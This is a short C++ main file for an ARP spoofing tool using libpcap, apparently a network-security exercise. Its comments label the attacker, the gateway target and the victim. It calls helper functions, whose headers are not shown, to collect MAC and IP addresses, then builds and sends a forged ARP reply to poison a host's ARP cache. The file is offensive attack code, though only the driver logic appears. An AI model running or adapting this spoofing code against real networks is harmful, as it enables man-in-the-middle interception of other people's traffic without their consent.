#include <iostream>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "parse_data.h"
#include "parse_data_in_linux.h"
#include "get_target_data.h"
#include "get_victim_data.h"
#include "make_send_reply_packet.h"

using namespace std;

//READ ME
//attacker =  my pc
//target   =  gateway
//victim  =   sender

int main(int argc, char *argv[]){
    parse_data parse(argc,argv);
    parse_data_in_linux(&parse); //get host mac & ip
    get_target_data(&parse);    //get gateway mac
    get_victim_data(&parse);     //get target mac
    make_send_reply_packet(&parse); //send ARP reply to target
    send_reply_arp(parse.using_send_arp_reply_pcaphandle(),parse.using_send_arp_reply_packet(),parse.using_send_arp_reply_length());
    pcap_close(parse.using_send_arp_reply_pcaphandle());
    return 0;
}
